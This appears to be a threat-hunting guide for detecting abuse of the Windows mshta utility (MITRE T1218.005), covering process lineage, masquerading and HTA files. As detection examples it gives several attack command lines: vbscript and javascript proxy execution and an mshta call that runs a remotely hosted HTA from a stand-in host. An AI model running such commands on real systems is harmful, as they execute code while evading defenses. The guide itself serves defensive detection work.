---
title: mshta Hunt
category: Defense Evasion
tags: [TECHNIQUE T1218.005, System Binary Proxy Execution, HTA, windows]
---
Mshta is attractive to adversaries both in the early and latter stages of an infection because it enables them to proxy the execution of arbitrary code through a trusted utility.
# Process and command-line monitoring
## Monitor process execution and command-line parameters for suspicious use of Mshta
Look for Mshta being executed with command lines containing protocol handlers like javascript, vbscript, about, etc.

**Example:**

```mshta vbscript:CreateObject("WScript.Shell").Run("notepad.exe")(window.close)```

Collect parent-child process relationships and identify any suspicious process lineage patterns involving Mshta.

**Example:**

Parent process: winword.exe

Child process: mshta.exe

## Monitor process metadata
Internal process name: mshta.exe
	Apparent filename: calc.exe

## File monitoring and network connections
Monitor file activity for the presence of Mshta-related files, such as HTA files (ending with .hta extension).
Look for Mshta executing remotely hosted HTA content via URIs or UNC paths.
	Command line: mshta http://example.com/malicious.hta

## Suspicious process ancestry
For example, an adversary conducting a phishing attack might embed a macro in a Microsoft Word document that executes a malicious HTA file.

Parent process: winword.exe
Child process: mshta.exe

## Mshta masquerading
```C:\Test\notepad.exe "javascript:a=new ActiveXObject("WScript.Shell");a.Run("powershell.``` 

```exe%20-nop%20-Command%20Write-Host%20f83a289e-8218-459c-9ddb-ccd3b72c732a;%20Start-Sleep%20-Seconds%202;%20exit",0,true);close();"```

## Network connections and HTA content
File extension: .pdf
MIME type: application/hta

## False positive mitigation
Fine-tune detection logic to account for legitimate and expected use of Mshta in your environment.

# Reference
https://redcanary.com/threat-detection-report/techniques/mshta/#:~:text=Suspicious%20process%20ancestry,executes%20a%20malicious%20HTA%20file